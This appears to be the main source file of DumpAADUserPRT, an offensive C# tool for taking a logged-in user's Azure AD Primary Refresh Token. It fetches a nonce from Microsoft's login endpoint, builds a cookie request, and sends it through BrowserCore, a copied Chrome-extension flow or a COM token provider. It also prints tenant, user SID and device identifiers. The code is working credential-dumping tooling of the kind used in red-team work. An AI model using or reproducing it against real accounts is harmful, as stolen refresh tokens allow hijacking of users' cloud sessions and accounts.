using System;
using System.IO;
using System.Text;
using System.Net;
using GetAadJoinInformation;

namespace ROADToken
{
    
    class Program
    {
        public static string nonce = "";

        public static string PrepBody()
        {

            if (nonce == "")
            {
                string url = "https://login.microsoftonline.com/Common/oauth2/token";
                var request = (HttpWebRequest)WebRequest.Create(url);

                var postData = "grant_type=srv_challenge";
                var data = Encoding.ASCII.GetBytes(postData);

                request.Method = "POST";
                request.ContentType = "application/x-www-form-urlencoded";
                request.ContentLength = data.Length;

                using (var stream = request.GetRequestStream())
                {
                    stream.Write(data, 0, data.Length);
                }

                var response = (HttpWebResponse)request.GetResponse();

                StreamReader reader = new StreamReader(response.GetResponseStream());
                string responseFromServer = reader.ReadToEnd();
                response.Close();


                string[] split = responseFromServer.Replace(" ", string.Empty).Replace("\n", string.Empty).Split('"');
                for (int i = 0; i < split.Length; i++)
                {
                    if (split[i] == "Nonce")
                        nonce = split[i + 2];
                }

                Console.WriteLine("[+] Obtained nonce: " + nonce);
            }
            
            string body = "{\"method\":\"GetCookies\",\"uri\":\"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=" + nonce + "\",\"sender\":\"https://login.microsoftonline.com\"}";
            
            return body;
        }


        static public void printHelp()
        {
            Console.WriteLine(
                "DumpAADUserPRT\n" +
                "More info: https://github.com/Hagrid29/DumpAADUserRPT\n" +
                "Options:\n" +
                "Generate nonce:\n" +
                    "\tDumpAADUserRPT.exe get_nonce\n" +
                "Dump PRT by sending request as stdin to BrowserCore:\n" +
                    "\tDumpAADUserRPT.exe get_token [nonce <nonce>]\n" +
                "Dump PRT by copying the behaviour of Chrome extension:\n" +
                    "\tDumpAADUserRPT.exe get_token ChromeExtension [nonce <nonce>] [pause <second>]\n" +
                "Dump PRT by interacting with COM object:\n" +
                    "\tDumpAADUserRPT.exe get_token TokenProvider [nonce <nonce>]\n" +
                "Print AAD info:\n" +
                    "\tDumpAADUserRPT.exe check_aad\n"
            );

        }

        static public void checkAAD()
        {
            //dsregcmd.exe /status
            //a section titled "SSO State" and AzureAdPrt will be set to YES.

            var dsreg = Dsregcmd.GetInfo();
            if(dsreg.JoinType == JoinType.DSREG_UNKNOWN_JOIN)
            {
                Console.WriteLine("JoinType:\t\tThe type of join is not known.");
            }
            else if(dsreg.JoinType == JoinType.DSREG_DEVICE_JOIN)
            {
                Console.WriteLine("JoinType:\t\tThe device is joined to Azure Active Directory (Azure AD).");
            }
            else if(dsreg.JoinType == JoinType.DSREG_WORKPLACE_JOIN)
            {
                Console.WriteLine("JoinType:\t\tAn Azure AD work account is added on the device.");
            }
            else if(dsreg.JoinType == JoinType.DSREG_NO_JOIN)
            {
                Console.WriteLine("JoinType:\t\tThe device is not joined to any domain.");
            }
            Console.WriteLine("TenantDisplayName:\t" + dsreg.TenantDisplayName);
            Console.WriteLine("TenantId:\t\t" + dsreg.TenantId);
            Console.WriteLine("UserEmail:\t\t" + dsreg.UserInfoEmail);
            if(dsreg.UserInfoKeyname != null)
            {
                string[] split = dsreg.UserInfoKeyname.Split('/');
                if (split.Length > 0)
                {
                    Console.WriteLine("UserSID:\t\t" + split[0]);
                }
            }
            Console.WriteLine("NgcKeyId:\t\t" + dsreg.UserInfoKeyId);
            Console.WriteLine("DeviceId:\t\t" + dsreg.DeviceId);
        }

        static void Main(string[] args)
        {
            bool isDefault = false;
            bool isChromExtension = false;
            bool isTokeProvider = false;
            bool isPause = false;
            int timeout = 10000; //10 second
            if (args.Length > 0)
            {
                if(args[0] == "get_token")
                {
                    for(int i = 1; i < args.Length; i++)
                    {
                        if (args[i] == "ChromeExtension")
                            isChromExtension = true;
                        if (args[i] == "TokenProvider")
                            isTokeProvider = true;
                        if (args[i] == "nonce")
                        {
                            nonce = args[i + 1];
                            Console.WriteLine("[+] Using nonce: " + nonce);
                        }
                        if (args[i] == "pause")
                        {
                            isPause = true;
                            timeout = Int32.Parse(args[i + 1]) * 1000;
                        }
                    }
                    isDefault = !(isChromExtension || isTokeProvider);
                }
                else if(args[0] == "get_nonce")
                {
                    PrepBody();
                }
                else if (args[0] == "print_help") 
                {
                    printHelp();
                }
                else if (args[0] == "check_aad") 
                {
                    checkAAD();
                }

            }


            if (isChromExtension)
            {
                DumpAADUserPRT.ChromeExtension.GetPRT(isPause, timeout);
            }
            else if (isTokeProvider)
            {
                DumpAADUserPRT.TokenProvider.GetPRT();
            }
            else if(isDefault)
            {
                DumpAADUserPRT.BrowserCore.GetPRT();
            }

        }
    }
}
